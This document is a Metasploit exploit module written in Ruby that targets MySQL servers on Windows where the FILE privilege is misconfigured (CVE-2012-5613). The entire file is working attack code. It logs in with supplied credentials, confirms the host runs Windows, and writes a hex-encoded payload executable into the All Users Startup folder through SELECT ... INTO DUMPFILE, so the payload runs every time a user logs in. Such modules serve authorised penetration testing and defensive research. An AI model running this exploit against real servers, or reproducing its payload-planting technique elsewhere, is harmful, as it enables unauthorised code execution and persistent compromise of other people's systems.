# Current source: https://github.com/rapid7/metasploit-framework
##
 
require &#039;msf/core&#039;
 
class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking
 
  include Msf::Exploit::Remote::MYSQL
  include Msf::Exploit::EXE
  include Msf::Exploit::FileDropper
 
  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;Oracle MySQL for Microsoft Windows FILE Privilege Abuse&#039;,
      &#039;Description&#039;    => %q{
        This module takes advantage of a file privilege misconfiguration problem
        specifically against Windows MySQL servers. This module abuses the FILE
        privilege to write a payload to Microsoft&#039;s All Users Start Up directory
        which will execute every time a user logs in. The default All Users Start
        Up directory used by the module is Windows 7 friendly.
      },
      &#039;Author&#039;         =>
        [
          &#039;sinn3r&#039;,
          &#039;Sean Verity <veritysr1980[at]gmail.com&#039;
        ],
      &#039;DefaultOptions&#039; =>
        {
          &#039;DisablePayloadHandler&#039; =>  &#039;true&#039;
        },
      &#039;License&#039;        => MSF_LICENSE,
      &#039;References&#039;     =>
        [
          [&#039;CVE&#039;, &#039;2012-5613&#039;], #DISPUTED
          [&#039;OSVDB&#039;, &#039;88118&#039;],
          [&#039;EDB&#039;, &#039;23083&#039;],
          [&#039;URL&#039;, &#039;http://seclists.org/fulldisclosure/2012/Dec/13&#039;]
        ],
      &#039;Platform&#039;       => &#039;win&#039;,
      &#039;Targets&#039;        =>
        [
          [ &#039;MySQL on Windows&#039;, { } ]
        ],
      &#039;DefaultTarget&#039;  => 0,
      &#039;DisclosureDate&#039; => &#039;Dec 01 2012&#039;
    ))
 
    register_options(
      [
        OptString.new(&#039;USERNAME&#039;, [ true, &#039;The username to authenticate as&#039;]),
        OptString.new(&#039;PASSWORD&#039;, [ true, &#039;The password to authenticate with&#039;]),
        OptString.new(&#039;STARTUP_FOLDER&#039;, [ true, &#039;The All Users Start Up folder&#039;, &#039;/programdata/microsoft/windows/start menu/programs/startup/&#039;])
      ])
  end
 
  def check
    m = mysql_login(datastore[&#039;USERNAME&#039;], datastore[&#039;PASSWORD&#039;])
    return Exploit::CheckCode::Safe unless m
 
    return Exploit::CheckCode::Appears if is_windows?
 
    Exploit::CheckCode::Safe
  end
 
  def peer
    "#{rhost}:#{rport}"
  end
 
  def query(q)
    rows = []
 
    begin
      res = mysql_query(q)
      return rows unless res
      res.each_hash do |row|
        rows << row
      end
    rescue RbMysql::ParseError
      return rows
    end
 
    rows
  end
 
  def is_windows?
    r = query("SELECT @@version_compile_os;")
    r[0][&#039;@@version_compile_os&#039;] =~ /^Win/ ? true : false
  end
 
  def get_drive_letter
    r = query("SELECT @@tmpdir;")
    drive = r[0][&#039;@@tmpdir&#039;].scan(/^(\w):/).flatten[0] || &#039;&#039;
 
    drive
  end
 
  def upload_file(bin, dest)
    p = bin.unpack("H*")[0]
    query("SELECT 0x#{p} into DUMPFILE &#039;#{dest}&#039;")
  end
 
  def exploit
    unless datastore[&#039;STARTUP_FOLDER&#039;].start_with?(&#039;/&#039;) && datastore[&#039;STARTUP_FOLDER&#039;].end_with?(&#039;/&#039;)
      fail_with(Failure::BadConfig, "STARTUP_FOLDER should start and end with &#039;/&#039; Ex: /programdata/microsoft/windows/start menu/programs/startup/")
    end
 
    print_status("#{peer} - Attempting to login as &#039;#{datastore[&#039;USERNAME&#039;]}:#{datastore[&#039;PASSWORD&#039;]}&#039;")
    begin
      m = mysql_login(datastore[&#039;USERNAME&#039;], datastore[&#039;PASSWORD&#039;])
    rescue RbMysql::AccessDeniedError
      fail_with(Failure::NoAccess, "#{peer} - Access denied")
    end
 
    fail_with(Failure::NoAccess, "#{peer} - Unable to Login") unless m
 
    unless is_windows?
      fail_with(Failure::NoTarget, "#{peer} - Remote host isn&#039;t Windows")
    end
 
    begin
      drive = get_drive_letter
    rescue RbMysql::ParseError
      fail_with(Failure::UnexpectedReply, "#{peer} - Could not determine drive name")
    end
 
    fail_with(Failure::UnexpectedReply, "#{peer} - Could not determine drive name") unless drive
 
    exe_name = Rex::Text::rand_text_alpha(5) + ".exe"
    dest     = "#{drive}:#{datastore[&#039;STARTUP_FOLDER&#039;]}#{exe_name}"
    exe      = generate_payload_exe
 
    print_status("#{peer} - Uploading to &#039;#{dest}&#039;")
    begin
      upload_file(exe, dest)
    rescue RbMysql::AccessDeniedError
      fail_with(Failure::NotVulnerable, "#{peer} - No permission to write. I blame kc :-)")
    end
    register_file_for_cleanup("#{dest}")
  end
 
end

